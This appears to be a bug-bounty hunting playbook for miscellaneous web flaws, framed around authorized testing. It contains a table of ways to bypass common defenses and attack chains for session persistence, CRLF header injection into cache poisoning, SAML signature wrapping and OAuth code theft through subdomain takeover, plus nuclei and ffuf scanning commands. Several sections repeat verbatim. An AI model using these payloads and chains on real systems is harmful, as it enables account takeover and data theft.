grep -r "internal_api\|/_internal/\|/internal/" --include="*.rb" --include="*.js"
```

**Dangling subdomain / DNS check:**
```bash
# Check for obsolete DNS records
dig CNAME handbook.gitlab.com
curl -sI https://handbook.gitlab.com | head -5
# Look for NXDOMAIN or 404 on hosting provider = takeover candidate

# SPF check
dig TXT rubylang.org | grep spf
# Missing or ~all = email spoofing risk
```

---

### Bypass Techniques

**Defender mitigations and how to bypass them:**

| Defense | Bypass |
|---|---|
| Email verification on invitation | Accept token in a different session before verification step completes; test if token is single-use or multi-use |
| Role check on API endpoint | Find alternative API versions (`/v3/` vs `/v4/`), GraphQL aliases, or internal endpoints that skip middleware |
| SAML signature validation | Strip signature element entirely; use XML namespace confusion; inject additional unsigned `Assertion` elements |
| PAT scope enforcement | Find endpoints that check scope at the collection level but not on individual sub-resources; test legacy API versions |
| Token revocation on user removal | Revoke at the org level but not at the app/installation level; test cross-installation token reuse |
| Input sanitization on header values | Try `%0d%0a`, `\r\n`, `\u000d\u000a`, null bytes followed by CRLF; test middleware version-specific parsing |
| Restricting internal API to localhost | Find SSRF vector (Sentry URL, webhook URL) to make server call the internal endpoint on your behalf |
| ReDoS regex hardening | Try different anchor points — if `#` is patched, try `?`, `%`, or other RFC-special characters that trigger backtracking |
| Dependency pinning | Change package names slightly (typosquatting) or target internal package names that aren't published to public registry |
| Subdomain claim validation | Monitor for hosting provider account deletions; use certificate transparency logs to find unclaimed subdomains |

---

### Operator-level pattern

When you confirm a misc primitive at A, **immediately** ask: what state-machine, cache layer, sibling endpoint, or auth-state-skew can amplify it? The first primitive is the entry pass. The chain is the deliverable. Every Workstream-A skill citation in this bundle pairs with at least one chain shape above:
- `hunt-auth-bypass` — Chains 2, 4, 5
- `hunt-cache-poison` — Chain 3
- `hunt-saml` — Chain 4
- `hunt-subdomain` — Chain 6
- `hunt-ato` — Chains 1, 2, 5, 6 (all terminal-impact paths)

---### Validation and proof
### Gate 0 Validation

Before writing the report, answer these three questions:

1. **What can the attacker DO right now?**
   Must be a concrete action: read customer PII, escalate to admin role, take over an account, transfer a domain asset, exfiltrate an API token, inject a response header. "Could potentially..." is not sufficient.

2. **What does the victim LOSE?**
   Must map to a real asset: customer data, account control, financial assets (domains), credentials, code repository contents, or platform trust. "Security best practices not followed" is not a valid answer.

3. **Can it be reproduced in 10 minutes from scratch?**
   Write out the exact steps (no special tooling, no race conditions that require luck). If you need pre-existing conditions (e.g., must already be a maintainer), state them explicitly and verify they're realistic for an attacker to achieve.

---

### C. Validation / proof bar — how to confirm and avoid false positives

- Misc is the highest N/A category (per this skill's own triage note). Before writing anything: name the concrete security boundary crossed (two parsers, two origins, two users, browser vs server) and show a sensitive consequence — data read, state change, credential leak, or RCE. "Interesting behavior" is not a finding.
- **Side-channel/XS-Leak bar**: confabulation and statistical noise are not findings. Demonstrate recovery of a *specific* sensitive value with a repeatable oracle, ideally across multiple runs, and disclose the number of samples and success rate. A theoretical timing difference alone is often closed as informational.
- **Parser differentials** must be shown end-to-end: the same input is interpreted differently by two named components AND that difference changes an authorization/cache/routing decision. Merely observing two different status codes is a lead, not a report.
- **Cookie-prefix bypass**: prove the forged cookie is accepted by the backend *and* causes a real effect (session fixation, CSRF-token overwrite, reflected XSS). Browsers differ — Safari rejects multibyte whitespace in cookie names but allows U+0085/U+00A0; state which browser your PoC used. Django declined the Unicode-whitespace case because it relies on trusting subdomains, so check whether the program considers untrusted subdomains in scope.
- **CSP findings**: a CSP allow-list gadget is only viable if the effective directive permits it (multiple enforced policies must all allow the host; `strict-dynamic`/nonces change the answer). Report-only headers block nothing. Prefer a Collaborator-received credential as the proof.
- **CRLF/desync/cache-poisoning tests can affect real users.** Use a unique cache buster, a dedicated test account/host, and bounded request counts; never leave a poisoned cache entry or a desynced connection pool behind. Distinguish cache *poisoning* (serve attacker content to others) from cache *deception* (store a victim's private response) — test both but report them separately.
- **HTTP/3 and DoS-class primitives** (>100k rps, downgrade fuzzing, ping-of-death, range amplification) require explicit authorization. Capture bounded, reproducible evidence and stop.
- Defer to dedicated skills for the exploitation write-up once the primitive is confirmed — use misc for discovery methodology and the cross-layer framing, then chain (e.g., misc parser differential → `request-smuggling` → `web-cache` → Critical).
- Re-evaluate "best practice only" findings against current browser reality: missing HSTS with no MitM position, missing CAA, and generic cookie flags are routinely closed. Pair them with a demonstrated position (cache, subdomain, MitM, or credential exfil) before reporting.
- Keep a research-to-target mapping note: a novel technique from a Top-10 list is only useful if the target actually runs the affected stack (e.g., Nginx `proxy_pass $uri`, a specific ORM, h3). Confirm the version/pattern in recon first, otherwise you are reporting a theoretical class rather than an exploitable bug.

### C. Validation / proof bar — how to confirm and avoid false positives (confabulation is NOT a finding for AI classes)

1. **Desync is not proven by a weird status code or a timeout.** Confirm with a deterministic oracle: a time-delay on a subsequent victim request, or a unique/victim-specific response that cannot be produced without the desync. Classic timeout-based detection is heavily fingerprinted and blocked by WAFs; prefer parser-discrepancy detection.
2. **RQP needs a specific verifiable artifact** — the GitLab case proved impact by capturing *another user's vulnerability-report video*. Random cross-user responses with no identifiable content are noise, not proof.
3. **Cache poisoning must show a poisoned response actually served to a different visitor.** The Cloudflare case was notable because the desync was internal and hijacked arbitrary third-party sites — show the cross-tenant/cross-site delivery, not just that you can inject a header.
4. **Header disclosure via Expect needs a masked internal value**, not just a version banner (banners are more compliance noise than critical; Netlify explicitly declined the banner case).
5. **Don't report theoretical protocol observations.** PortSwigger notes that findings like "this server accepts a single LF as a line terminator" are harmless for direct access and rarely pay; they become valuable only when you demonstrate exploitation behind a specific front-end.
6. **Keep the standard proof bar for out-of-class findings.** A finding with no clean class still needs a reproducible state change, an OOB callback, or a verifiable cross-user artifact. Confabulation is an AI-class concern; the protocol analogue is "the scanner said desync" — require the differential response or victim impact.
7. **Route, don't squat.** Once a finding maps cleanly to an existing class skill, hand it off with the PoC and let that skill's validation bar govern the report. This index exists to prevent misses, not to become a dumping ground.### Escalation and related chains
### Chains & Compositions (Senior Hunting)

A checklist tells you what to look for one bug at a time. Senior work composes primitives into multi-step engagements that reach impact. Each chain below is built from existing primitives in this skill's methodology and root causes — paired with a secondary primitive from a neighbouring skill. The pattern across them all: **the secondary primitive is what produces impact**. A standalone soft-delete IDOR is N/A; pair it with a session-store that doesn't invalidate, and it's High.

### Chain 1 — Soft-Delete + Post-Removal Session Persistence → Cross-Tenant PII

- **A.** Identify a "remove member" endpoint that flips an `active=false` flag or deletes a membership row but does NOT invalidate the user's session or revoke their issued tokens (root cause #1: soft deletes without permission invalidation).
- **B.** Log in as the to-be-removed staff member; capture the session cookie / PAT.
- **C.** Have the org admin remove the user via the normal flow. Wait. Re-issue the same API calls (`GET /admin/orders`, `GET /admin/payouts`, `GET /admin/customers`) using the captured token.
- **Impact:** API calls keep succeeding for days or weeks post-removal — cached permission checks pass the old auth context. GDPR/CCPA breach exposure; potential extortion leverage; competitive intelligence theft.
- **Real shape:** Shopify removed-staff session persistence class (2022); GitLab cached-permissions-after-removal class. Pairs with `account-takeover` Path 5 (session-fixation).

### Chain 2 — Invitation Token Reuse + Skipped Verification → Privileged Role Injection

- **A.** Receive an invitation link for a low-privilege role at the target.
- **B.** Before completing email verification, POST the invitation token from a different session (incognito browser / anonymous request).
- **C.** Server grants the invited role without re-verifying that the consuming session matches the invited email — new identity inherits the invitation's scope.
- **Impact:** Privilege-escalated foothold without owning the invited email address. For partner-portal invitations (where a partner-tier role manages hundreds of downstream merchants), this is the Shopify Partners-class Critical.
- **Real shape:** Multiple H1 Shopify Partners disclosures 2020-2022 (root cause #2). Pairs with `auth-bypass` step 7 (invitation flow verification).

### Chain 3 — CRLF in Ruby Header + Cache Poisoning → Mass Stored XSS at CDN Scale

- **A.** Identify CRLF injection in a Ruby `Net::HTTP` / Rack response header — user-controlled value flows into `Location:` or a custom `X-*` header (root cause #7: Ruby header injection via string interpolation).
- **B.** Inject `%0d%0aSet-Cookie: session=attacker` or a duplicate `Cache-Control: public, max-age=3600` that pollutes the cache-key normalisation across CDN tiers.
- **C.** Cache stores the poisoned response for the full max-age. Every CDN-edge visitor in the affected geo receives the attacker's `Set-Cookie` or attacker-controlled body.
- **Impact:** Cross-customer XSS / session fixation at full CDN scale; persistent until cache TTL expires; affects every visitor to that path.
- **Real shape:** GitLab CRLF + cache poisoning chain (H1 #1160407 / Iustin Ladunca, 2021); Rack 3 behavioural-change ecosystem advisories (2022-2023). Pairs with `web-cache` citation #7 and #10 (Akamai hop-by-hop class).

### Chain 4 — SAML XSW + Parser Differential → Admin Claim Injection → SSO ATO

- **A.** Capture a valid SAMLResponse via the legitimate auth flow (Burp filter for `SAMLResponse=` POST bodies on `/saml/acs` or `/Shibboleth.sso`).
- **B.** Inject a sibling `<Assertion>` element so the signature-checker XML parser (REXML/Xerces) resolves a different node than the business-logic XML parser (Nokogiri/JAXP). Sign the outer benign assertion; embed `<NameID>admin@victim</NameID>` in the unsigned inner assertion.
- **C.** SP signature validates against the outer element; SP business logic reads the inner one; admin role assumed without password or MFA.
- **Impact:** Full enterprise SSO compromise. Every SAML-gated app inherits the spoofed admin identity for the session lifetime.
- **Real shape:** GitHub Enterprise CVE-2025-25291 / CVE-2025-25292 (parser differential, 2025); samlify CVE-2025-47949. Cross-refs `auth-bypass` Disclosed Report Citation #5 and #7, and root cause #5 (SAML XML parsing quirks).

### Chain 5 — Token-Scope Check at Issuance, Not at Use → Cross-Tenant Write via Low-Scope PAT

- **A.** Create a personal access token / OAuth token with `read:user` scope only. Confirm via `GET /api/me/tokens`.
- **B.** Call a write endpoint that should require `write:*` (e.g. `DELETE /repos/{org}/{repo}/issues/{n}`). Server checks "is authenticated" via middleware but the individual handler doesn't re-verify the PAT's scope subset.
- **C.** Write action succeeds despite the token being read-only.
- **Impact:** PAT scope model is functionally broken — every read-only token is write-equivalent on the affected endpoints. Mass-exploitable across the userbase by anyone with a leaked PAT.
- **Real shape:** GitHub PAT scope-at-issuance-not-at-use class (root cause #3). Pairs with step 4 (PAT scope enforcement fuzzing) and `api-misconfig` JWT scope bypasses.

### Chain 6 — Subdomain Takeover at OAuth `redirect_uri` Allowlist → Auth-Code Theft → ATO

- **A.** Enumerate OAuth `redirect_uri` allowlist via the `/oauth/authorize` flow; note any wildcard `*.target.com` or takeover-candidate hostname in the static list.
- **B.** Find a takeover-able subdomain (`legacy.target.com` CNAME'd to deleted Vercel project / Heroku app / S3 bucket — `subdomain-takeover` step 1).
- **C.** Claim the subdomain. Host an OAuth callback receiver. Send victim to `/oauth/authorize?redirect_uri=https://legacy.target.com/cb&response_type=code&...`. Auth code lands on attacker host. Exchange via token endpoint. ATO.
- **Impact:** Persistent 1-click ATO every time the OAuth flow runs against the affected client.
- **Real shape:** Microsoft Azure DevOps `cloudapp.azure.com` + wildcard `*.visualstudio.com` reply_to chain (Binary Security, Nov 2022). Cross-refs `subdomain-takeover` Disclosed Report Citation #12.

### Related Skills & Chains

- **`saml`** — SAML signature wrapping (XSW1–XSW8) is the canonical "misc auth" critical. Chain primitive: SAML XSW + `saml` AttributeStatement injection → NameID swap → ATO of victim admin via SSO with no password.
- **`logic-and-design`** — Misc role/permission desync bugs overlap with business-logic state-machine flaws. Chain primitive: business logic (invitation-before-verify) + role assignment without identity confirmation → tenant takeover.
- **`auth-bypass`** — Session-revocation gaps and stale-token issues are pure auth-bypass primitives. Chain primitive: removed user retains session token → `auth-bypass` → post-termination data exfil and persistent access.
- **`account-takeover`** — Most misc auth bugs end at account takeover. Chain primitive: signature-stripping / NameID injection + `account-takeover` Path 6 (JWT/SAML manipulation) → admin ATO across enterprise.
- **`security-arsenal`** — Load the SAML Raider payload pack, the session-revocation probe checklist, and the Always-Rejected list (rate-limiting on auth, theoretical issues, user enumeration without sensitive PII).
- **`triage-validation`** — Apply the 7-Question Gate plus the Body-Diff Rule: misc bugs are the highest-N/A category — a state desync claim needs a concrete cross-tenant read or admin-action PoC, not just "the API let me call it".

### Chain 1 — Soft-Delete + Post-Removal Session Persistence → Cross-Tenant PII

- **A.** Identify a "remove member" endpoint that flips an `active=false` flag or deletes a membership row but does NOT invalidate the user's session or revoke their issued tokens (root cause #1: soft deletes without permission invalidation).
- **B.** Log in as the to-be-removed staff member; capture the session cookie / PAT.
- **C.** Have the org admin remove the user via the normal flow. Wait. Re-issue the same API calls (`GET /admin/orders`, `GET /admin/payouts`, `GET /admin/customers`) using the captured token.
- **Impact:** API calls keep succeeding for days or weeks post-removal — cached permission checks pass the old auth context. GDPR/CCPA breach exposure; potential extortion leverage; competitive intelligence theft.
- **Real shape:** Shopify removed-staff session persistence class (2022); GitLab cached-permissions-after-removal class. Pairs with `hunt-ato` Path 5 (session-fixation).

### Chain 2 — Invitation Token Reuse + Skipped Verification → Privileged Role Injection

- **A.** Receive an invitation link for a low-privilege role at the target.
- **B.** Before completing email verification, POST the invitation token from a different session (incognito browser / anonymous request).
- **C.** Server grants the invited role without re-verifying that the consuming session matches the invited email — new identity inherits the invitation's scope.
- **Impact:** Privilege-escalated foothold without owning the invited email address. For partner-portal invitations (where a partner-tier role manages hundreds of downstream merchants), this is the Shopify Partners-class Critical.
- **Real shape:** Multiple H1 Shopify Partners disclosures 2020-2022 (root cause #2). Pairs with `hunt-auth-bypass` step 7 (invitation flow verification).

### Chain 3 — CRLF in Ruby Header + Cache Poisoning → Mass Stored XSS at CDN Scale

- **A.** Identify CRLF injection in a Ruby `Net::HTTP` / Rack response header — user-controlled value flows into `Location:` or a custom `X-*` header (root cause #7: Ruby header injection via string interpolation).
- **B.** Inject `%0d%0aSet-Cookie: session=attacker` or a duplicate `Cache-Control: public, max-age=3600` that pollutes the cache-key normalisation across CDN tiers.
- **C.** Cache stores the poisoned response for the full max-age. Every CDN-edge visitor in the affected geo receives the attacker's `Set-Cookie` or attacker-controlled body.
- **Impact:** Cross-customer XSS / session fixation at full CDN scale; persistent until cache TTL expires; affects every visitor to that path.
- **Real shape:** GitLab CRLF + cache poisoning chain (H1 #1160407 / Iustin Ladunca, 2021); Rack 3 behavioural-change ecosystem advisories (2022-2023). Pairs with `hunt-cache-poison` citation #7 and #10 (Akamai hop-by-hop class).

### Chain 4 — SAML XSW + Parser Differential → Admin Claim Injection → SSO ATO

- **A.** Capture a valid SAMLResponse via the legitimate auth flow (Burp filter for `SAMLResponse=` POST bodies on `/saml/acs` or `/Shibboleth.sso`).
- **B.** Inject a sibling `<Assertion>` element so the signature-checker XML parser (REXML/Xerces) resolves a different node than the business-logic XML parser (Nokogiri/JAXP). Sign the outer benign assertion; embed `<NameID>admin@victim</NameID>` in the unsigned inner assertion.
- **C.** SP signature validates against the outer element; SP business logic reads the inner one; admin role assumed without password or MFA.
- **Impact:** Full enterprise SSO compromise. Every SAML-gated app inherits the spoofed admin identity for the session lifetime.
- **Real shape:** GitHub Enterprise CVE-2025-25291 / CVE-2025-25292 (parser differential, 2025); samlify CVE-2025-47949. Cross-refs `hunt-auth-bypass` Disclosed Report Citation #5 and #7, and root cause #5 (SAML XML parsing quirks).

### Chain 5 — Token-Scope Check at Issuance, Not at Use → Cross-Tenant Write via Low-Scope PAT

- **A.** Create a personal access token / OAuth token with `read:user` scope only. Confirm via `GET /api/me/tokens`.
- **B.** Call a write endpoint that should require `write:*` (e.g. `DELETE /repos/{org}/{repo}/issues/{n}`). Server checks "is authenticated" via middleware but the individual handler doesn't re-verify the PAT's scope subset.
- **C.** Write action succeeds despite the token being read-only.
- **Impact:** PAT scope model is functionally broken — every read-only token is write-equivalent on the affected endpoints. Mass-exploitable across the userbase by anyone with a leaked PAT.
- **Real shape:** GitHub PAT scope-at-issuance-not-at-use class (root cause #3). Pairs with step 4 (PAT scope enforcement fuzzing) and `hunt-api-misconfig` JWT scope bypasses.

### Chain 6 — Subdomain Takeover at OAuth `redirect_uri` Allowlist → Auth-Code Theft → ATO

- **A.** Enumerate OAuth `redirect_uri` allowlist via the `/oauth/authorize` flow; note any wildcard `*.target.com` or takeover-candidate hostname in the static list.
- **B.** Find a takeover-able subdomain (`legacy.target.com` CNAME'd to deleted Vercel project / Heroku app / S3 bucket — `hunt-subdomain` step 1).
- **C.** Claim the subdomain. Host an OAuth callback receiver. Send victim to `/oauth/authorize?redirect_uri=https://legacy.target.com/cb&response_type=code&...`. Auth code lands on attacker host. Exchange via token endpoint. ATO.
- **Impact:** Persistent 1-click ATO every time the OAuth flow runs against the affected client.
- **Real shape:** Microsoft Azure DevOps `cloudapp.azure.com` + wildcard `*.visualstudio.com` reply_to chain (Binary Security, Nov 2022). Cross-refs `hunt-subdomain` Disclosed Report Citation #12.

### Related Skills & Chains

- **`hunt-saml`** — SAML signature wrapping (XSW1–XSW8) is the canonical "misc auth" critical. Chain primitive: SAML XSW + `hunt-saml` AttributeStatement injection → NameID swap → ATO of victim admin via SSO with no password.
- **`hunt-business-logic`** — Misc role/permission desync bugs overlap with business-logic state-machine flaws. Chain primitive: business logic (invitation-before-verify) + role assignment without identity confirmation → tenant takeover.
- **`hunt-auth-bypass`** — Session-revocation gaps and stale-token issues are pure auth-bypass primitives. Chain primitive: removed user retains session token → `hunt-auth-bypass` → post-termination data exfil and persistent access.
- **`hunt-ato`** — Most misc auth bugs end at account takeover. Chain primitive: signature-stripping / NameID injection + `hunt-ato` Path 6 (JWT/SAML manipulation) → admin ATO across enterprise.
- **`security-arsenal`** — Load the SAML Raider payload pack, the session-revocation probe checklist, and the Always-Rejected list (rate-limiting on auth, theoretical issues, user enumeration without sensitive PII).
- **`triage-validation`** — Apply the 7-Question Gate plus the Body-Diff Rule: misc bugs are the highest-N/A category — a state desync claim needs a concrete cross-tenant read or admin-action PoC, not just "the API let me call it".### Tools
### Nuclei

Start broad, then classify the root cause and open the matching skill.

```sh
nuclei -u https://target -tags vuln,cve,exposure \
       -severity low,medium,high,critical -rl 40 -o nuclei_other.txt
nuclei -u https://target -t ~/nuclei-templates/http/exposures \
       -rl 40 -o nuclei_other_exposures.txt
nuclei -u https://target -t ~/nuclei-templates/http/vulnerabilities/generic \
       -rl 40 -o nuclei_other_generic.txt
# authenticated surface: add -H 'Cookie: session=...' or -H 'Authorization: Bearer ...'
```

Triage every hit by hand: a template match is a lead, not a finding. Update templates with `nuclei -update-templates`.

### Wordlists

Mined from this class's writeups and ready for `ffuf`/`feroxbuster`. Paths and parameters recur across programs; verify each hit.

| File | Entries |
|---|---:|
| `~/.local/share/hackerone-reports/wordlists/paths_other.txt` | 150 |
| `~/.local/share/hackerone-reports/wordlists/params_other.txt` | 150 |
| `~/.local/share/hackerone-reports/wordlists/paths.txt` (global) | 500 |
| `~/.local/share/hackerone-reports/wordlists/params.txt` (global) | 400 |

```sh
W=~/.local/share/hackerone-reports/wordlists
ffuf -u https://target/FUZZ -w $W/paths_other.txt \
     -mc all -fc 404 -fs 0 -rate 40
ffuf -u 'https://target/api?FUZZ=canary' -w $W/params_other.txt \
     -mr 'canary|error|invalid|not found' -rate 40
```### Real-world examples
### Real Impact Examples

**Scenario A — Privilege Escalation via Unverified Partner Invitation (Shopify-class)**
An attacker receives a partner invitation link for a low-privilege role. Before completing email verification, they use the invitation token in a session authenticated as a different account (or no account). The platform grants the elevated partner role without confirming identity, allowing the attacker to access merchant data, install apps, or modify store configurations for all stores in the partner account. Business impact: full partner-level access to hundreds of merchant stores with no legitimate relationship established.

**Scenario B — Cross-Tenant Data Persistence After Removal (Shopify/GitLab-class)**
A staff member with restricted permissions is removed from a company account after a dispute. Their session token remains valid because revocation only updates the membership table, not the session store. The ex-employee continues to access customer PII, order data, and financial reports via direct API calls for days or weeks post-termination. Business impact: GDPR/CCPA breach exposure, potential extortion leverage, competitive intelligence theft.

**Scenario C — SAML Signature Bypass for Account Takeover (GitHub Enterprise-class)**
An attacker targeting a GitHub Enterprise instance with SAML SSO enabled crafts a SAML response where the `Signature` element is stripped or moved to cover only a non-critical assertion attribute. The XML parser accepts the document as valid; the signature verifier passes because the signed sub-element validates correctly; the NameID (username/email) in the unsigned portion is set to a victim admin account. Attacker authenticates as the victim with no knowledge of their password or MFA. Business impact: full admin access to all private repositories, CI/CD secrets, and GitHub Actions workflows in the enterprise.

---### Sources and related reading
### D. Sources — numbered list of URLs you actually fetched

1. https://portswigger.net/research/top-10-web-hacking-techniques-of-2025
2. https://portswigger.net/research/http3-in-burp-suite
3. https://portswigger.net/research/cookie-chaos-how-to-bypass-host-and-secure-cookie-prefixes
4. https://portswigger.net/research/crlf-powered-desync-attacks
5. https://portswigger.net/research/making-http-header-injection-critical-with-one-prompt
6. https://portswigger.net/research/blind-trust-stealing-credentials-through-csp
7. https://portswigger.net/research/can-ai-do-novel-security-research
8. https://portswigger.net/research/top-10-web-hacking-techniques-of-2024
9. https://securitycipher.com/2026/07/19/web-cache-poisoning-playbook-2026/

### D. Sources — numbered list of URLs you actually fetched

1. https://portswigger.net/research/http1-must-die (Black Hat/DEF CON 2025: V-H/H-V discrepancies, CL.0, 0.CL deadlock + `/con` gadget, double-desync, Expect-based attacks, case studies, $350K+ bounties; webfetched)
2. https://blog.cloudflare.com/resolving-a-request-smuggling-vulnerability-in-pingora (Cloudflare Pingora CVE-2025-4366, cache-hit body consumption, ~24M sites)
3. https://www.securityweek.com/new-http-request-smuggling-attacks-impacted-cdns-major-orgs-millions-of-websites/ (Akamai CVE-2025-32094, T-Mobile/GitLab/Netlify bounties, $276K reported)
4. https://www.bugcrowd.com/blog/unveiling-te-0-http-request-smuggling-discovering-a-critical-vulnerability-in-thousands-of-google-cloud-websites/ (TE.0 via GCP Load Balancer, IAP bypass, $8,500)
5. https://portswigger.net/web-security/request-smuggling (request-smuggling overview and research index)
6. https://www.intigriti.com/researchers/blog/hacking-tools/top-4-new-attack-vectors-in-web-application-targets (2025-2026 emerging vectors, LLM prompt injection first among them)### Additional notes
### Approach

- Classify the root cause before choosing a playbook.
- Search the corpus for similar titles and technologies.
- Read the closest class skill and adapt its checklist.

### Parameters observed

`username` · `password` · `template` · `url` · `hash` · `id` · `callback` · `ingredients[]` · `email` · `variant` · `shop` · `month` · `year` · `report_id` · `checkout_token` · `template[]` · `next` · `data` · `token` · `subject`

### Search

```sh
python3 ~/.local/share/hackerone-reports/h1.py search "<keyword>" --class other
```

### Search

```sh
python3 ~/.local/share/hackerone-reports/h1.py search "<keyword>" --class other
```

---### Companion methodology (deduplicated)
### hunting / references/techniques.md

# misc — Technique reference

Moved out of `SKILL.md` to keep the main playbook lean. Load this file when you need concrete technique.

---

## Bypass Techniques



**Defender mitigations and how to bypass them:**



| Defense | Bypass |

|---|---|

| Email verification on invitation | Accept token in a different session before verification step completes; test if token is single-use or multi-use |

| Role check on API endpoint | Find alternative API versions (`/v3/` vs `/v4/`), GraphQL aliases, or internal endpoints that skip middleware |

| SAML signature validation | Strip signature element entirely; use XML namespace confusion; inject additional unsigned `Assertion` elements |

| PAT scope enforcement | Find endpoints that check scope at the collection level but not on individual sub-resources; test legacy API versions |

| Token revocation on user removal | Revoke at the org level but not at the app/installation level; test cross-installation token reuse |

| Input sanitization on header values | Try `%0d%0a`, `\r\n`, `\u000d\u000a`, null bytes followed by CRLF; test middleware version-specific parsing |

| Restricting internal API to localhost | Find SSRF vector (Sentry URL, webhook URL) to make server call the internal endpoint on your behalf |

| ReDoS regex hardening | Try different anchor points — if `#` is patched, try `?`, `%`, or other RFC-special characters that trigger backtracking |

| Dependency pinning | Change package names slightly (typosquatting) or target internal package names that aren't published to public registry |

| Subdomain claim validation | Monitor for hosting provider account deletions; use certificate transparency logs to find unclaimed subdomains |



---

### hunting / references/techniques.md

# Other & emerging classes — Technique reference

Moved out of `SKILL.md` to keep the main playbook lean. Load this file when you need concrete technique.

---

## Techniques from real reports



Concrete lessons from reports outside the main classes.



- **Github access token exposure** — `#1087489` · Shopify · $50,000 · ▲1601

  > As a proof I can tell you that on the repo github.com/Shopify/shopify at commit hash `cea9c273391d` the sha512 of the README.md is…

- **WannaCrypt “Killswitch”** — `#228648` · HackerOne · $0 · ▲809

  > Original disclosure: https://www.malwaretech.com/2017/05/how-to-accidentally-stop-a-global-cyber-attacks.html

- **Steal ALL collateral during liquidation by exploiting lack of validation in `flip.kick`** — `#684092` · BlockDev Sp. Z o.o · $0 · ▲466

  > I've attached to this report a modified version of `end.t.sol` which contains a test (`test steal all collateral using flipper`) that reproduces the attack.

- **June 2022 Incident Report** — `#1622449` · HackerOne · $0 · ▲426

  > | 2022-06-22 10:30 PDT | Call with a customer requesting an investigation into reports of an intimidating and suspicious off-platform communication from an actor with the handle "rzlr" |

- **Bypass of GitLab CI runner slash fix in YAML validation** — `#409395` · GitLab · $0 · ▲363

  > The reason is that the fix in place preventing url normalization is performed by doing the YAML validation, however this could be bypassed by setting the environment variable in `https://gitlab.com/{project id}/settings/ci cd`

- **An attacker can archive and unarchive any structured scope object on HackerOne** — `#1501611` · HackerOne · $0 · ▲318

  > This can be found by base64 encoding: gid://hackerone/StructuredScope/NUMBER

- **Bypass Email Verification -- Able to Access Internal Gitlab Services that use Login with Gitlab and Perform Check on email domain** — `#565883` · GitLab · $0 · ▲249

  > - Visit `https://gitlab.com/groups/GROUP PATH/-/saml` and setup the SAML SSO as documented

- **Spring Actuator endpoints publicly available and broken authentication** — `#838635` · LY Corporation · $12,500 · ▲234

  > Due to insufficient access control, it was possible to access the Spring Boot Actuator endpoints /heapdump and /env.

- **Github Account hijack through broken link in developer.twitter.com** — `#1031321` · X / xAI · $0 · ▲222

  > A link in https://developer.twitter.com/en/docs/twitter-api/tools-and-libraries was broken and anyone could create that account which leads to account impersonate

- **Ability To Delete User(s) Account Without User Interaction** — `#928255` · GitLab · $0 · ▲221

  > Since Gitlab doesn't verify the request with an Valid ID before triggering Right to Access/Deletion this breaches the GDPR Law(Article 15) & moreover allows an attacker to delete User Accounts without user interaction.

- **Handling of `tracking` command allows making arbitrary blind requests with user's cookies from Grammarly Extension's origin** — `#389108` · Superhuman (formerly Grammarly) · $0 · ▲202

  > `gnar.setUser`/`gnar. execQueue` / `gnar. send` / `gnar. doSend` / `gnar. enqueue`

- **HackerOne making payments in USDC (Coinbase stable coin)** — `#1220747` · HackerOne · $0 · ▲201

  > This is not new, this has been requested from many of you, and also some members of our Hacker Advisory board.

- **2020-10-09 Credential Stuffing Attack** — `#1007689` · HackerOne · $0 · ▲196

  > On October 4, 2020 and October 5, 2020, an attacker launched two [credential stuffing attacks](https://owasp.org/www-community/attacks/Credential stuffing) against HackerOne.com.

- **protected Tweet settings overwritten by other settings** — `#664038` · X / xAI · $0 · ▲178

  > ==I have deleted all data (stored data and cache), so you don't need to save any cache or history!==

- **Frans Visits Vegas Announcement** — `#251747` · Frans Visits Vegas · $0 · ▲154

  > Frans Rosén, aka, “The Swedish Ninja” (Yea, I’ve always wanted to be called that, I’ll try to make it happen by force)

- **Informations disclosure - Access to some checkout informations** — `#1064869` · Shopify · $0 · ▲150

  > It came to my attention that using the CheckoutStatus query on `https://arrive-server.shopifycloud.com/graphql` it is possible to access some checkout details, specifically the query can be called with an ID value ranging from `1` up to `48908`.

- **h1-202 leaderboard photo discloses local wifi password** — `#329798` · HackerOne · $0 · ▲145

  > Local attackers could connect to the wifi and sniff any unencypted traffic, as well as DoS the network (potentially).

- **`socket` command allows sending data over WebSockets to arbitrary origins from Grammarly Extension** — `#395729` · Superhuman (formerly Grammarly) · $0 · ▲140

  > `evil.com` connects to `ws://good.com` using WS = server at `good.com` is responsible for `Origin` header validation.

- **Build fetches jars over HTTP** — `#506161` · PortSwigger Web Security · $1,000 · ▲135

  > [Comcast continues to inject its own code into websites you visit](https://thenextweb.com/insights/2017/12/11/comcast-continues-to-inject-its-own-code-into-websites-you-visit/ ) (over HTTP)

- **[URGENT] Opportunity to publish tweets on any twitters account** — `#208978` · X / xAI · $0 · ▲119

  > Write-up of the vulnerability here: https://medium.com/@kedrisec/publish-tweets-by-any-other-user-6c9d892708e3

- **HackerOne Code sends live password-reset tokens to Segment in automatic page events** — `#4000185` · HackerOne · $200 · ▲115

  > The token appears in `context.page.search`, `context.page.url`, `properties.search`, and `properties.url`.

- **Lack of Rate Limiting on Account Creation Endpoint** — `#2915502` · XVIDEOS · $200 · ▲110

  > Set the ██████████ type to numbers and range it from `0` to `1000`.

- **SMAP bypass** — `#1048322` · PlayStation · $0 · ▲110

  > The problem is, the fault handler `copy fault` does not clear `%RFLAGS.AC`, meaning that it remains set after `copyin()`/`copyout()` returns.

- **DLL side-loading vulnerability in Sony Music Center for PC Ver. 2.7.2 (Latest version)** — `#3355766` · Sony · $0 · ▲109

  > MITRE reference: https://attack.mitre.org/techniques/T1574/001/

- **Rate limit bypass on passport.acronis.work using X-Forwarded-For request header** — `#2627062` · Acronis · $0 · ▲106

  > in case you wanted to try to login to a victims account as attacker, such as `ab@acronis.com` which I found on snov.io you can't if you aren't from bulgaria, you will be restricted due to you are not from bulgaria and you see that error `ERR-B258C8`

- **[Bypass #645264] Report title disclosure despite the program settings for email notification is set to "No Content"** — `#669438` · HackerOne · $500 · ▲104

  > I have found that email invitation for a collaborator (bounty splitting) still disclosing the Report title in email when the notification comes from `Manage Collaborator` invitation.

- **Use Github pack with Coda employee github account (search code of Coda's private repositories)** — `#676581` · Superhuman (formerly Grammarly) · $0 · ▲104

  > If you look at the requests in Burp, you will see a request to https://coda.io/embed/igvicDMruo?viewMode=gallery&disconnected=true that is loaded in an `<iframe ` (it is the document you see when you load the template).

- **HTML Injection in LinkedIn Premium Support Chat** — `#3079966` · LinkedIn · $0 · ▲102

  > `https://www.linkedin.com/premium/survey/?destRedirectURL=https%3A%2F%2Fwww.linkedin.com%2Fsearch%2Fresults%2Fall%2F%3Fkeywords%3Dtest%2520card%2520bugbounty%26origin%3DGLOBAL SEARCH HEADER%26sid%3Dn%253Bl`

